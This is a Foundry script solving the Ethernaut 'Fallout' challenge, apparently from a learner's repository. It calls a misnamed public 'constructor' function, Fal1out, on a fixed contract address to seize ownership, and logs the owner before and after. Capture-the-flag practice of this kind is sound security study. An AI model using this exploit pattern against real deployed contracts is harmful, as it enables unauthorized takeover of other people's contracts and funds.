//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// Goal:
// you claim ownership of the contract

//Solution
// Easyyy , the contract does not have a constructor and the function that establishes the owner is public and accessible
//All we have to do is call the function and we become the owner

import {Fallout} from "../src/Fallout.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance =
        Fallout(payable(0x08bd89882c37087ba0b56AB4383Ea3dd8b9afdD8));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before: ", falloutInstance.owner());

        falloutInstance.Fal1out();

        console.log("Owner after: ", falloutInstance.owner());

        vm.stopBroadcast();
    }
}
